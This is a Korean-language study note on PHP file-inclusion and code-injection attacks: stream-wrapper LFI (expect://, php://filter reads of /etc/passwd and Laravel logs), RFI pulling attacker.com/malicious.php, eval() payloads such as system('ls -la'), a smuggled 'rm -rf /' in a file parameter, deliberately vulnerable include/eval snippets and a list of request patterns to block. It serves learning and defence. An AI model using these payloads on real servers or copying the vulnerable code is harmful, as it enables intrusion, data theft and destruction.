### **Wrapper를 이용한 LFI 취약점 악용**

PHP에서는 **Wrapper**를 이용하여 **파일 읽기** 외에도 다른 기능을 수행할 수 있습니다. Wrapper는 파일 경로 앞에 붙여서 특정 프로토콜이나 방법을 지정하는 방식입니다.

#### **일반적인 PHP Wrapper**

* expect//: system command를 실행시켜 준다
```
  ?page_num=expect://ls
```

* php://filter: encode / decode 옵션으로 서버 안에 존재하는 문서를 열람할 수 있다.
```
?page_num=php://filter/convert.base64-encode/resource=[목적 파일]       (base64로 인코딩하여 확인)
```

* zip://: zip파일의 압축을 풀고 해당파일을 실행한다(웹쉘 응용)
```
?page_num=zip://file.zip#web_shell.php
```

#### **그 외 PHP Wrapper**
* `file://`: 로컬 파일 시스템에서 파일을 읽을 때 사용
* `http://`: 외부 HTTP URL을 통해 파일을 읽을 때 사용
* `ftp://`: FTP 서버에서 파일을 읽을 때 사용
* `data://`: 임베디드 데이터 URL을 통해 파일을 읽을 때 사용

이러한 Wrapper를 이용하면, LFI 취약점을 악용하여 **로컬 시스템 파일**뿐만 아니라 **원격 서버의 파일**을 포함시키는 방식으로 공격할 수 있습니다.

---

### **Wrapper를 이용한 LFI 공격 예시**

#### 1. **file://을 이용한 LFI**

`file://` 프로토콜을 사용하여 로컬 파일을 읽을 수 있습니다. 예를 들어:

```
http://example.com/vulnerable.php?page=file:///etc/passwd
```

위 URL에서는 `file:///etc/passwd`를 사용하여 `/etc/passwd` 파일을 포함시키려고 시도합니다.

#### 2. **[http://을](http://을) 이용한 원격 파일 포함 (RFI와 비슷한 방식)**

`http://`를 사용하면 원격 서버의 파일을 포함시킬 수 있습니다. 이를 이용하면 **원격 파일 포함**(RFI, Remote File Inclusion)처럼 작동할 수 있습니다.

```
http://example.com/vulnerable.php?page=http://attacker.com/malicious_file.php
```

이 공격에서는 원격 서버(`attacker.com`)의 악성 PHP 파일을 포함시켜서 원격 서버에서 실행되는 코드를 서버에 삽입할 수 있습니다.

#### 3. **data://을 이용한 인코딩된 코드 포함**

`data://`를 사용하면 **Base64로 인코딩된 파일**을 포함할 수 있습니다. 예를 들어:

```
http://example.com/vulnerable.php?page=data:text/plain;base64,SGVsbG8gd29ybGQ=
```

위 URL에서 `SGVsbG8gd29ybGQ=`는 "Hello world"를 Base64로 인코딩한 값입니다. 이는 PHP 코드로 실행될 수 있는 형식으로 변환될 수 있습니다.


---


**Laravel 프레임워크를 타겟으로 한 고전적인 로컬 파일 읽기(Local File Inclusion, LFI)** 및 **PHP 스트림 래퍼 우회 공격 시도**

### 1. `/_ignition/execute-solution`

* Laravel Debugbar 또는 Ignition 디버거에 의해 노출된 **디버그 툴 엔드포인트**
* 개발 환경에서 활성화됨 (`APP_DEBUG=true`)
* 의도: 문제 해결 솔루션을 실행하거나 내부 상태를 진단
* 공격자 입장에서는 **LFI, RCE, SSRF 등 다양한 취약점 탐색 포인트**

### 2. `php://filter`

* PHP의 **스트림 래퍼(stream wrapper)** 중 하나
* `php://filter/read=convert.base64-encode/resource=<file>` 같은 형식으로 사용됨
* 목적: **로컬 파일을 base64로 인코딩해서 노출**
* 예:

  ```php
  file_get_contents("php://filter/read=convert.base64-encode/resource=/etc/passwd")
  ```

### 3. `php://filter/read=consumed/resource=...`

* 이건 우회 시도입니다.
* `read=consumed` 는 유효하지 않은 옵션이지만, **WAF나 로그 필터링 우회를 위한 패턴일 수 있음**
* 진짜 의도는 `php://filter/read=convert.base64-encode/resource=../storage/logs/laravel.log` 같은 요청일 수 있어요.


공격자는 Laravel 로그 파일을 읽어서:

1. `APP_KEY`, `DB_PASSWORD`, `API 토큰` 등 민감한 정보 추출
2. 에러 메시지나 스택 트레이스 통해 **경로, 구성 정보 파악**
3. 다음 단계 공격 (예: deserialization + RCE 등) 준비
---

## 🚫 차단할 수 있는 요청 패턴 예

* 경로:

  * `/_ignition/execute-solution`
  * `/vendor/phpunit/`
  * `/storage/logs/`
* 내용:

  * `php://filter`
  * `read=convert.base64-encode`
  * `laravel.log`


---

### **코드 인젝션 (Code Injection) 취약점**

**코드 인젝션(Code Injection)** 취약점은 공격자가 악성 코드를 서버의 실행 과정에 삽입하여 실행하도록 만드는 공격입니다. PHP에서는 **`include()`, `require()`, `eval()`** 함수들을 자주 사용하게 되는데, 이 함수들이 제대로 검증되지 않은 외부 입력을 처리할 경우 공격자가 악성 코드를 삽입하고 실행시킬 수 있습니다.

#### **1. include(), require() 함수 취약점**

`include()`나 `require()`는 외부 PHP 파일을 포함시킬 때 사용되는 함수입니다. 이 함수들은 웹 입력을 통해 동적으로 포함되는 파일 경로를 받아 처리하는데, 사용자가 입력한 데이터를 검증 없이 파일 경로로 사용하면 **파일 포함 공격**(File Inclusion Attack)에 취약해질 수 있습니다.

예시:

```php
<?php
  $file = $_GET['id'];  // 사용자 입력
  include($file . ".php");  // 외부 파일 포함
?>
```

위 코드에서 `$_GET['id']` 값을 통해 사용자가 파일 경로를 입력하면, 해당 파일이 포함되어 실행됩니다. 문제는 **경로 탐색 공격**이나 **악성 파일 포함**이 가능해진다는 것입니다.

#### **취약점 설명**

* **상위 디렉터리 탐색 공격**: `../`를 이용하여 다른 디렉터리로 이동할 수 있습니다. 이를 통해 서버의 민감한 파일을 포함시킬 수 있습니다.
* **원격 파일 포함 (RFI)**: 만약 서버에서 `allow_url_include` 설정이 켜져 있으면, 공격자는 원격 서버에 있는 악성 PHP 파일을 포함시킬 수 있습니다.

#### **2. eval() 함수 취약점**

`eval()` 함수는 PHP 코드를 **문자열로** 실행하는 함수입니다. 이 함수에 사용자 입력이 들어가면 공격자가 **PHP 코드를 실행**시킬 수 있습니다.

예시:

```php
<?php
  $code = $_GET['code'];  // 사용자 입력
  eval($code);  // 사용자 입력을 PHP 코드로 실행
?>
```

#### **취약점 설명**

* 공격자가 **자기 자신의 PHP 코드를** 입력하여 서버에서 실행시킬 수 있습니다. 예를 들어, 서버에서 임의의 명령어를 실행하거나 시스템을 제어하는 악성 코드를 넣을 수 있습니다.
* 이 경우, 사용자가 제공한 **코드가 그대로 실행되기 때문에** 이를 검증하지 않으면, 원격에서 악성 PHP 코드를 실행시킬 수 있습니다.

---

### **공격 페이로드 예시**

#### **1. 파일 포함 취약점 공격 (LFI 또는 RFI)**

##### **RFI (Remote File Inclusion)** 공격

`allow_url_include`가 활성화되어 있으면, 원격 서버에서 파일을 포함시킬 수 있습니다.

**URL 예시**:

```
http://example.com/vulnerable.php?id=http://attacker.com/malicious.php
```

위의 URL은 `attacker.com`에 위치한 악성 PHP 파일을 포함시키려는 공격입니다. 이 파일은 서버에서 실행되어 **악성 코드**를 삽입할 수 있습니다.

#### **2. eval() 함수 취약점 공격**

**PHP 코드 실행**을 위해 `eval()` 함수가 사용될 때, 공격자는 악성 PHP 코드를 입력하여 서버에서 실행시킬 수 있습니다.

**URL 예시**:

```
http://example.com/vulnerable.php?code=phpinfo();
```

위의 URL은 `phpinfo()` 함수를 실행하여 서버의 **환경 정보**를 출력하는 PHP 코드를 실행시키는 공격입니다. 이 정보를 통해 공격자는 서버에 대한 중요한 정보를 얻을 수 있습니다.

#### **3. 악성 코드 삽입**

`eval()` 함수에 악성 PHP 코드를 삽입할 수 있습니다.

**URL 예시**:

```
http://example.com/vulnerable.php?code=system('ls -la'); // 서버 명령어 실행
```

이 코드는 `system('ls -la')` 명령을 실행하여 서버의 파일 목록을 출력합니다. 이처럼 `eval()`을 악용하면 **서버 명령어 실행**을 통해 공격자가 서버를 제어할 수 있습니다.

```
GET /api.php?file=example.txt;rm%20-rf%20/
```







---
* 코드(Code) 인젝션서버의 PHP 코드 실행 과정에 공격자의 코드를 삽입시키는 위협으로 가장 많은 공격은 서버에서 수행 코드를 내포시키는 include(), include_once(), require(), require_once() 함수들을 대상으로 해서 자신의 코드가 실행 과정에 반영되도록 하는 것입니다.
* include ($_GET['id'].".php");위의 사례처럼 웹 입력 자료를 기반으로 이들 함수를 사용한다면 철저한 사전 검사를 해야 합니다.
* 또다른 코드 인젝션의 위험성은 eval() 함수 사용입니다. eval() 함수로 PHP 코드를 문자열로 전달하면 그대로 수행하기 때문에 eval() 함수 파라미터가 혹여라도 웹 입력과 연관성이 있다면 철저한 사전 검사를 반드시 수행해야 합니다.


위의 요청은 파일 이름을 전달하는 API에서 쉘 명령어를 주입하여 파일 삭제나 시스템 명령어 실행을 유도할 수 있습니다.
